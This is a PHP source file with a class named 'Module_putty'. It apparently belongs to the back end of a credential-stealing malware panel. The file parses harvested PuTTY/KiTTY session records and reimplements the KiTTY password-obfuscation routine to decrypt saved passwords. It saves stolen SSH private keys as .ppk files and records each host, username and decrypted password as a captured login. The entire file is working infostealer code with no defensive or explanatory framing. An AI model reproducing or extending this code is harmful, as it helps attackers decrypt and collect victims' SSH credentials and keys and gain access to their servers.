<?php
class Module_putty extends Module_ //XOR
{
	private function retable(&$table, $base)
	{
		$p = 0;
		for ($i = 0; $i < strlen($table); $i++)
		{
			$j = (ord($base[$p])+$i) % strlen($table);
			$c = $table[$j];
			$table[$j] = $table[$i];
			$table[$i] = $c;

			$p++;

			if ($p >= strlen($base))
			{
				$p = 0;
			}
		}
	}

	private function Decrypt($Host, $Term, $Password)
	{
		if (strlen($Password) <= 5)
			return '';

		if (!strlen($Term))
			$Term = 'xterm';

		$Table = 'AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn0123456789+/';
		$base = substr($Password, 0, 5);
		$Password = substr($Password, 5);

		$this->retable($Table, $base);

		$cl = 0;
		$Result = '';

		for ($n = 0; $n < strlen($Password); $n++)
		{
			if ($Table[strlen($Table)-1] == $Password[$n])
			{
				for ($i = 0; $i < strlen($Table); $i++)
				{
					if ($Table[$i] == $Password[$n])
					{
						$cl = $cl + $i;
						break;
					}
				}

				$base = $Host.$Term.'KiTTY';
				$this->retable($Table, $base);
				continue;
			}

			for ($i = 0; $i < strlen($Table); $i++)
			{
				if ($Table[$i] == $Password[$n])
				{
					$Result .= chr($cl+$i);
					break;
				}
			}
			$cl = 0;
		}

		return $Result;
	}
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
			case 0:
			{
				$stream = new Stream($Data, strlen($Data));

				while(TRUE)
				{
					$Host	= $stream->getSTRING_();
					if($Host == NULL)
						break;
					
					$User 	= $stream->getSTRING_();
					$Pass	= $stream->getSTRING_();
					$Term 	= $stream->getSTRING_();
					$Port	= $stream->getDWORD();
					$PKey 	= $stream->getBINARY_();
					
					if($PKey != NULL)
					{
						if($Port == 22 || $Port == 0)
							$Port = '';
						
						$this->insert_downloads($User . "@" . $Host . $Port . ".ppk", $PKey);
					}
					else if($Pass != NULL)
					{
						$Pass = $this->Decrypt($Host, $Term, $Pass);
						$this->add_ftp($this->append_port($this->ftp_force_ssh($Host), $Port), $User, $Pass);
					}
				}

				break;
			}
        default:
            return FALSE;
        }

        return TRUE;
    }
}